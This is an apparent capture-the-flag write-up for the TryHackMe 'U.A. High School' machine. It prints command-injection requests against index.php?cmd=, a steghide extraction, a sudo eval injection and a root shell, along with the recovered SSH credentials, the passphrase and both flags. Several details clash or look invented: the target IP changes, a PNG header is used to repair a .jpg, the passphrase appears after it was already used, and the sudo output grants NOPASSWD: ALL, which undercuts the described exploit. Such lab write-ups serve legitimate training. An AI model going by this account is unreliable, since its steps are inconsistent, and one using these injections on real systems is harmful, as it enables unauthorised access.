
1. Introduction

This penetration testing assessment was conducted against the U.A. High School machine hosted on TryHackMe. The objective was to identify vulnerabilities, gain initial access, and escalate privileges to root in a controlled CTF environment.

The assessment followed standard methodology:

    Reconnaissance
    Web enumeration
    Exploitation
    Data extraction (steganography + decoding)
    Privilege escalation
    Root flag capture

2. Reconnaissance & Web Enumeration
Port/Service Discovery

Initial scanning revealed a web application hosted on:

http://10.112.128.138

Directory enumeration was performed using:

dirsearch -u http://10.112.128.138

Findings:

/assets/
/assets/images/
/assets/index.php

The /assets/images/ directory contained two image files:

oneforall.jpg
yuei.jpg

3. Image Analysis & Recovery

Files were downloaded for offline analysis:

wget http://10.112.128.138/assets/images/oneforall.jpg
wget http://10.112.128.138/assets/images/yuei.jpg

File Issue Detected

One image appeared corrupted:

file oneforall.jpg

Output:

data (incorrect PNG/JPEG signature)

Fixing Image (Magic Bytes Repair)

Hex inspection:

xxd oneforall.jpg | head

Correct PNG header was identified:

89 50 4E 47

After correcting file structure, the image became readable.
4. Steganography Extraction

Using steghide:

steghide extract -sf oneforall.jpg

A passphrase was required.
Password found from hidden content:

AllmightForEver!!!

Extracted file:

creds.txt

Contents:

deku:One?For?All_!!one1/A

5. Initial Access (SSH Login)

Using extracted credentials:

ssh deku@10.112.146.X

Login successful.
6. User Flag

cat user.txt

Output

THM{W3lC0m3_D3kU_1A_0n3f0rAll??}

7. Web Command Injection Discovery

The web endpoint was found vulnerable:

http://10.112.128.138/assets/index.php?cmd=

Example exploitation:

curl "http://10.112.128.138/assets/index.php?cmd=ls"

Result showed command execution on server.
Write on Medium

Reverse shell attempts confirmed RCE capability.
8. Hidden Content Discovery

Further enumeration:

ls -la /var/www/html/assets/images

Decoded base64 outputs revealed:

/var/www/Hidden_Content

Inside:

passphrase.txt

Extracted passphrase:

curl http://.../passphrase.txt

Decoded:

AllmightForEver!!!

(This was used for steghide earlier.)
9. Privilege Escalation Path
Sudo Permissions Check

sudo -l

Output:

User deku may run:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL

This is a critical misconfiguration.
10. Exploiting feedback.sh (Privilege Escalation)

Script content:

/opt/NewComponent/feedback.sh

Key issue:

eval "echo $feedback"

This allows unsafe command evaluation.
Exploitation

Running:

sudo /opt/NewComponent/feedback.sh

Input:

$BASH

Output:

/bin/bash

This confirms command injection via eval.
Direct Root Shell

Since sudo allowed full privileges:

sudo /bin/bash

Result:

root access gained

11. Root Flag

cat /root/root.txt

Output:

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}

12. Key Vulnerabilities Identified

    Command Injection (index.php?cmd)
    Unsafe eval() usage in Bash script
    Sensitive file exposure in web directories
    Weak privilege separation (NOPASSWD: ALL)
    Information disclosure via steganography

13. Conclusion

The system was fully compromised through a combination of:

    Web enumeration
    Command injection
    Hidden file extraction
    Weak sudo configuration

Final result: root access achieved successfully
